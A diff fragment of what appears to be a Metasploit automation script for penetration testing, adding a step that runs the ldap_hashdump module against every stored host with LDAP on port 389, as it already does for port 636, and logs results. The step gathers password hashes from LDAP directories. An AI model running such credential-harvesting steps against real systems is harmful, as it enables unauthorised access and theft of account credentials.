@@ -387,7 +387,13 @@ sleep 5
 spool /root/output/msf/ldap.txt
 echo "####LDAP####"
 
-echo "LDAP Hashdump"
+echo "LDAP Hashdump 389"
+use auxiliary/gather/ldap_hashdump
+services -p 389 -u -R
+run
+sleep 5
+
+echo "LDAP Hashdump 636"
 use auxiliary/gather/ldap_hashdump
 services -p 636 -u -R
 run
